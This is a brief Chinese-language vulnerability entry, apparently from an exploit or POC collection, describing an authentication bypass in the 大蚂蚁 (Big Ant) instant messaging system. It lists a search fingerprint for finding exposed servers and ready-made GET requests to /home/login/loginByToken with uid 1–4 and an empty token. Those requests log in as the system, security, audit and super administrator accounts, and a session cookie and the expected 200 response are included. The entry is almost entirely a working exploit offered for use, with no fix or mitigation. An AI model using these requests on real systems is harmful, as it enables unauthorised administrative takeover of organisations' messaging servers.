# 大蚂蚁即时通信系统loginByToken存在权限认证绕过漏洞

- **系统**：大蚂蚁即时通信系统　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`product="即时通讯系统"`
- **请求**：`GET /home/login/loginByToken?uid=1&token= HTTP/1.1`

**请求体 / payload**
```
通过下列构造实现登录校验绕过
#系统管理员
/home/login/loginByToken?uid=1&token=
#安全管理员
/home/login/loginByToken?uid=2&token=
#审计管理员
/home/login/loginByToken?uid=3&token=
#超级管理员
/home/login/loginByToken?uid=4&token=
Host:
Cookie: PHPSESSID=m905cb6sucrf6i6munki07bc5c
```
- **预期**：200　|　—